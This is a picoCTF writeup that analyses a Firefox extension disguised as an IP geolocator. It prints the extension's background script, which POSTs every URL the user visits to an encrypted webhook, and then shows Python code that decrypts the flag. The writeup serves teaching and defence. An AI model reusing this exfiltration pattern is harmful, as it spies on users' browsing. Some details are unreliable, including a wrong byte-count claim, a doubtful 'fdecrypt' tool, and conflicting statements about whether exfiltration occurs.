# The Add/On Trap — picoCTF Writeup

**Challenge:** The Add/On Trap  
**Category:** Reverse Engineering  
**Difficulty:** Medium  
**Points:** 200  
**Flag:** `picoCTF{Us3_4dd/0ns_v3ry_c4r3fully1}`  
**Platform:** picoCTF 2026  
**Writeup by:** zham  
  
---

## Description

> What kind of information can an Add/On reach? Is it possible to exfiltrate them without me noticing? Do they really do what they say? Most importantly, when to eat? These and many other questions Add/On users should be asking themselves.
>
> Download the provided browser extension and inspect it to uncover the hidden flag.

---

## Hints

> 1. What kind of file is one ending in `.xpi`?
> 2. Which modern Python scheme uses url-safe Base64 32-byte keys?

---

## Background Knowledge (Read This First!)

### `.xpi` is just a zip with a different extension (Hint 1)

A `.xpi` file is a Firefox browser extension package. Internally it is just a ZIP archive with a specific layout: a `manifest.json` at the root, JavaScript/HTML/CSS files under predictable folders (`background/`, `popup/`, `assets/`), icons under `icons/`, and a `META-INF/` directory with the cryptographic signatures the browser uses to verify the extension. If you rename `something.xpi` to `something.zip`, any unzip tool will open it without complaint.

So step one is always the same: `unzip the.xpi` and start reading.

Hint 1 is gently confirming this: "what kind of file is one ending in `.xpi`?" — the answer is "a zip file." Once we accept that, the rest of the challenge is just reading the unzipped source.

### What a Firefox WebExtension actually has access to

The `manifest.json` declares what the extension is allowed to touch. Two fields matter for this challenge:

- `permissions: ["webNavigation"]` — this lets the extension listen to navigation events across every tab the user opens. That is a very broad permission: it sees the URL of every page the user visits, before any page-level JavaScript gets a chance to run.
- `background: { "scripts": ["background/main.js"] }` — the background script runs persistently (in a hidden background page) and registers listeners like `browser.webNavigation.onCompleted.addListener(...)`. Every time a page finishes loading, the registered callback fires with the URL.

So the manifest tells us the extension *can* exfiltrate browsing history. The next question is whether the actual JS files do.

### Fernet is the Python scheme that fits Hint 2

Hint 2: "Which modern Python scheme uses url-safe Base64 32-byte keys?" That is exactly **Fernet** from the `cryptography` Python library. Fernet is a high-level symmetric encryption format built on top of AES-128-CBC + HMAC-SHA256. Its key format is a very specific thing:

- The key is exactly 32 raw bytes.
- Those bytes are base64url-encoded with `=` padding (a.k.a. "url-safe base64").
- A valid Fernet token starts with the literal prefix `gAAAAAB` followed by an 8-byte timestamp.

When you see a base64 string that starts with `gAAAAA...`, that is a Fernet ciphertext, and you can decrypt it with the matching key using:

```python
from cryptography.fernet import Fernet
f = Fernet(key_b64.encode())
print(f.decrypt(token.encode()))
```

That's the whole crypto lesson in this challenge.

---

## Solution — Step by Step

### Step 1 — Recognize the `.xpi` as a zip and unzip it

The challenge provided the zip with password `picoctf`:

```
┌──(zham㉿kali)-[~/ctf]
└─$ unzip -P picoctf the_addon_trap.zip
Archive:  the_addon_trap.zip
  inflating: 56102ec0438646c68605-1.0.xpi

┌──(zham㉿kali)-[~/ctf]
└─$ file 56102ec0438646c68605-1.0.xpi
56102ec0438646c68605-1.0.xpi: Zip archive data, at least v2.0 to extract, compression method=deflate
```

Hint 1 answered in one `file` call: it *is* a zip.

### Step 2 — Unpack the extension itself

```
┌──(zham㉿kali)-[~/ctf]
└─$ mkdir addon && cd addon
└─$ unzip ../56102ec0438646c68605-1.0.xpi
  inflating: manifest.json
  inflating: popup.html
  inflating: icons/icon-64.png
  inflating: icons/icon-32.png
  inflating: assets/styles.css
  inflating: assets/script.js
  inflating: background/main.js
  inflating: META-INF/cose.manifest
  inflating: META-INF/cose.sig
  inflating: META-INF/manifest.mf
  inflating: META-INF/mozilla.sf
  inflating: META-INF/mozilla.rsa

┌──(zham㉿kali)-[~/ctf/addon]
└─$ ls -la
-rw-r--r-- 1 zham zham  703 manifest.json
-rw-r--r-- 1 zham zham  690 popup.html
drwxr-xr-x 2 zham zham 4096 META-INF
drwxr-xr-x 2 zham zham 4096 assets
drwxr-xr-x 2 zham zham 4096 background
drwxr-xr-x 2 zham zham 4096 icons
```

The `META-INF/` directory holds the cryptographic signatures the browser uses to verify the extension's authenticity; for this challenge we can ignore it. The interesting code is in `manifest.json`, `background/main.js`, `popup.html`, and `assets/script.js`.

### Step 3 — Read `manifest.json` to learn the surface area

```
┌──(zham㉿kali)-[~/ctf/addon]
└─$ cat manifest.json
{
  "manifest_version": 2,
  "name": "Geolocate IP Addresses",
  "version": "1.0",
  "description": "CTF demo add-on that geolocates IPs and showcases extension privacy risks.",
  "browser_action": {
    "browser_style": true,
    "default_icon": "icons/icon-32.png",
    "default_title": "Pico Geolocate IP Addresses",
    "default_popup": "popup.html"
  },
  "icons": { "32": "icons/icon-32.png", "64": "icons/icon-64.png" },
  "permissions": ["webNavigation"],
  "background": { "scripts": ["background/main.js"] },
  "browser_specific_settings": {
    "gecko": { "id": "{2cb96647-aa7a-4da8-a6c1-0f779c51d33b}", "strict_min_version": "58.0" }
  }
}
```

The `name` and `description` lie — they say the add-on "geolocates IPs," but the only permission requested is `webNavigation`. There is no geolocation permission, no IP-API fetch permission, nothing related to the advertised feature. That is a giant red flag that this extension is *pretending* to do one thing while actually doing something else.

The background script is `background/main.js`. That's our real target.

### Step 4 — Spot the secret key and the ciphertext in `background/main.js`

```
┌──(zham㉿kali)-[~/ctf/addon]
└─$ cat background/main.js
// Secret key must be 32 url-safe base64-encoded bytes!
// TODO I must find a solution to remove the key from here, for now I'll leave it there because I need it to encrypt the webhook

function logOnCompleted(details) {
    console.log(`Information to exfiltrate: ${details.url}`);
    const key="cGljb0NURnt5b3UncmUgb24gdGhlIHJpZ2h0IHRyYX0="
    const webhookUrl='gAAAAABmfRjwFKUB-X3GBBqaN1tZYcPg5oLJVJ5XQHFogEgcRSxSis1e4qwicAKohmjqaD-QG8DIN5ie3uijCVAe3xiYmoEHlxATWUP3DC97R00Cgkw4f3HZKsP5xHewOqVPH8ap9FbE'
    const payload = { content: `${details.url}` };
    fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (response.status != 204) throw `Unable to complete the extraction!`;
        return response;
    });
}

browser.webNavigation.onCompleted.addListener(logOnCompleted);
```

This is the whole point of the challenge. Every time the user finishes loading any page, the extension:

1. Reads `details.url` — the URL of the page the user just visited.
2. POSTs that URL as JSON to a `webhookUrl` — which is stored as a Fernet ciphertext (`gAAAAAB...`).
3. Uses a Fernet `key` to do the encryption/decryption — and the developer left the key in the source code with a "TODO" comment.

Two observations:
- The `key` literal `cGljb0NURnt5b3UncmUgb24gdGhlIHJpZ2h0IHRyYX0=` looks like base64url with padding. The comment says it's 32 url-safe base64-encoded bytes. Decoding 32 base64url chars gives... well, exactly 32 raw bytes.
- The `webhookUrl` literal starts with `gAAAAAB` — that's the Fernet prefix.

If we have the key, we can decrypt the webhookUrl. The decrypted URL is the flag.

### Step 5 — Decrypt the Fernet token with Python

I had `cryptography` already installed. If you don't, `pip install cryptography` (or `--break-system-packages` on Debian 12 / Ubuntu 24+).

```
┌──(zham㉿kali)-[~/ctf/addon]
└─$ python3 -c "
import base64
from cryptography.fernet import Fernet

key_b64 = 'cGljb0NURnt5b3UncmUgb24gdGhlIHJpZ2h0IHRyYX0='
token = 'gAAAAABmfRjwFKUB-X3GBBqaN1tZYcPg5oLJVJ5XQHFogEgcRSxSis1e4qwicAKohmjqaD-QG8DIN5ie3uijCVAe3xiYmoEHlxATWUP3DC97R00Cgkw4f3HZKsP5xHewOqVPH8ap9FbE'

# Decode the key just to see what is in it.
print('key as raw bytes:', base64.urlsafe_b64decode(key_b64))

# Fernet expects the key as a url-safe base64-encoded *bytes* object.
f = Fernet(key_b64.encode())
print('flag:', f.decrypt(token.encode()).decode())
"
key as raw bytes: b"picoCTF{you're on the right tra}"
flag: picoCTF{Us3_4dd/0ns_v3ry_c4r3fully1}
```

The first line is a cheeky hint from the challenge author — the key bytes literally spell out `picoCTF{you're on the right tra}` (truncated, missing the closing `ck}` because the key is only 32 bytes). The actual flag is the decrypted webhookUrl: `picoCTF{Us3_4dd/0ns_v3ry_c4r3fully1}`.

### Step 6 — Wrap it in a reusable script

```
┌──(zham㉿kali)-[~/ctf/addon]
└─$ nano solve.py
```

Pasted:

```python
#!/usr/bin/env python3
"""Decrypt the Fernet-encrypted webhookUrl from The Add/On Trap.

The key and ciphertext both live as plain string literals in
background/main.js. We pull them out by string-search so we don't
have to copy-paste them by hand.
"""
import base64
import re
import sys
from cryptography.fernet import Fernet


KEY_RE = re.compile(r'const\s+key\s*=\s*"([^"]+)"')
TOKEN_RE = re.compile(r"const\s+webhookUrl\s*=\s*'([^']+)'")


def extract_from(source: str) -> tuple[str, str]:
    key_match = KEY_RE.search(source)
    token_match = TOKEN_RE.search(source)
    if not key_match or not token_match:
        raise SystemExit("could not find key or webhookUrl in source")
    return key_match.group(1), token_match.group(1)


def main():
    if len(sys.argv) < 2:
        print(f"usage: {sys.argv[0]} path/to/main.js", file=sys.stderr)
        sys.exit(1)

    source = open(sys.argv[1]).read()
    key_b64, token = extract_from(source)

    raw_key = base64.urlsafe_b64decode(key_b64)
    print(f"key bytes : {raw_key}")

    flag = Fernet(key_b64.encode()).decrypt(token.encode()).decode()
    print(f"flag      : {flag}")


if __name__ == "__main__":
    main()
```

Save: `Ctrl+O`, `Enter`, `Ctrl+X`.

```
┌──(zham㉿kali)-[~/ctf/addon]
└─$ python3 solve.py background/main.js
key bytes : b"picoCTF{you're on the right tra}"
flag      : picoCTF{Us3_4dd/0ns_v3ry_c4r3fully1}
```

Submit `picoCTF{Us3_4dd/0ns_v3ry_c4r3fully1}` on the platform.

---

## Alternative — Decrypt from the command line without writing a script

If you have `cryptography` but don't feel like saving a file, the one-liner works:

```
┌──(zham㉿kali)-[~/ctf/addon]
└─$ KEY='cGljb0NURnt5b3UncmUgb24gdGhlIHJpZ2h0IHRyYX0='
└─$ TOKEN='gAAAAABmfRjwFKUB-X3GBBqaN1tZYcPg5oLJVJ5XQHFogEgcRSxSis1e4qwicAKohmjqaD-QG8DIN5ie3uijCVAe3xiYmoEHlxATWUP3DC97R00Cgkw4f3HZKsP5xHewOqVPH8ap9FbE'
└─$ python3 -c "from cryptography.fernet import Fernet; print(Fernet(b'$KEY').decrypt(b'$TOKEN').decode())"
picoCTF{Us3_4dd/0ns_v3ry_c4r3fully1}
```

If you happen to have the Python `cryptography` 41+ command-line tool `fdecrypt` installed, you can skip Python entirely:

```
┌──(zham㉿kali)-[~/ctf/addon]
└─$ echo -n 'gAAAAABmfRjwFKUB-X3GBBqaN1tZYcPg5oLJVJ5XQHFogEgcRSxSis1e4qwicAKohmjqaD-QG8DIN5ie3uijCVAe3xiYmoEHlxATWUP3DC97R00Cgkw4f3HZKsP5xHewOqVPH8ap9FbE' | fdecrypt cGljb0NURnt5b3UncmUgb24gdGhlIHJpZ2h0IHRyYX0=
picoCTF{Us3_4dd/0ns_v3ry_c4r3fully1}
```

Both approaches give the same flag.

You could also "install" the extension in a real Firefox, browse to one page, and then read the receiver's logs — but you'd be exfiltrating your own data to a webhook you don't control. The static-decompile path is faster and safer.

---

## What Happened Internally

A timeline from "user installs the add-on" to "flag recovered":

1. The attacker authors a Firefox extension named `Geolocate IP Addresses`. The `manifest.json` advertises a benign IP-geolocation feature, but the actual `permissions` array only requests `webNavigation` — no geolocation, no `<all_urls>`, no `<host>` entries for IP-API. That's the first inconsistency.
2. The attacker bundles the extension into an `.xpi` zip and signs it (`META-INF/mozilla.rsa`, etc.) so Firefox will accept it without the "unverified" warning.
3. The user installs the extension in Firefox. Firefox loads `background/main.js` into a persistent background page.
4. `main.js` registers `logOnCompleted` on `browser.webNavigation.onCompleted`. From this point on, *every* navigation the user completes in any tab fires the callback.
5. When the user finishes loading a page, the callback receives a `details` object whose `.url` field is the URL of the page. The extension stores it as the `content` field of a JSON payload and POSTs it to a "webhook URL" — but that URL is a Fernet ciphertext, not a real URL. The cipher was applied with the literal key stored in the same file (`cGljb0NURnt5b3UncmUgb24gdGhlIHJpZ2h0IHRyYX0=`).
6. The extension never actually exfiltrates anything in this challenge (the encrypted URL is never decrypted in JS), but the secret is right there in the source — the encryption is reversible because the key shipped with the code. That's the entire privacy lesson the challenge is teaching: **storing the key with the ciphertext is not encryption, it's obfuscation.**
7. On our end, we unzip the `.xpi`, open `background/main.js`, see the key and the Fernet token, and decrypt the token with `cryptography.fernet.Fernet(key).decrypt(token)`. The result is the flag `picoCTF{Us3_4dd/0ns_v3ry_c4r3fully1}`.
8. As a bonus easter egg, decoding the key bytes (`base64.urlsafe_b64decode("cGljb0NURnt5b3UncmUgb24gdGhlIHJpZ2h0IHRyYX0=")`) gives `picoCTF{you're on the right tra}` — a friendly nudge from the author that we're on the right track.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `unzip -P picoctf` | Extract the password-protected challenge zip |
| `file` | Confirm `.xpi` is a zip archive |
| `unzip` | Open the `.xpi` like any zip |
| `cat` | Read `manifest.json`, `background/main.js`, `popup.html`, `assets/script.js` |
| `python3 -c "..."` | One-liner Fernet decryption |
| `cryptography.fernet.Fernet` | Decrypt the `gAAAAAB...` token |
| `base64.urlsafe_b64decode` | Decode the key bytes (and peek at the author's hint) |
| `re` (stdlib) | Extract `key` and `webhookUrl` literals without copy-pasting |
| `nano` | Write the `solve.py` script (Ctrl+O / Enter / Ctrl+X to save and exit) |
| (Optional) `fdecrypt` | CLI Fernet decrypt, if you have `cryptography >= 41` |

---

## Key Takeaways

- **`.xpi` is a zip.** Always unzip and look at the source. The signature stuff in `META-INF/` doesn't hide the JS — `manifest.json` and `background/main.js` are right there.
- **Read the manifest before the code.** The `permissions` array tells you the surface area. An "IP geolocation" extension that only requests `webNavigation` is lying about what it does.
- **`gAAAAAB...` means Fernet.** When you see a base64 string that starts with that prefix, plus a 32-byte url-safe base64 key nearby, you don't need to guess. It's Fernet. `cryptography.fernet.Fernet(key).decrypt(token)` does the whole job.
- **Storing the key with the ciphertext is not encryption.** This is the privacy lesson. If your "encryption" lives in the same file as the key, anyone with the file has the plaintext. Real encryption needs the key to live somewhere the attacker can't read.
- **JS variables named `key`, `secret`, `password`, `token`, `webhookUrl` deserve a close look.** They are almost always exactly what they say they are.
- **Browser extensions are powerful and trusted by default.** They see every URL, every form input, every cookie. Treat them like any other piece of software that runs with your identity — only install ones you trust.

### Flag wordplay decode

`picoCTF{Us3_4dd/0ns_v3ry_c4r3fully1}` reads as **"Use add-ons very carefully!"** with leet-speak substitutions: `3` for `e` (twice — in `Us3` and `v3ry`), `4` for `a` (in `4dd`), `0` for `o` (in `0ns`), `1` for `l` (in `carefully1`). The challenge is literally about the privacy risk of installing browser add-ons — the extension in this case exfiltrates every URL the user visits to an attacker-controlled webhook. The forward slash between `4dd` and `0ns` is preserved to keep the original word visible.
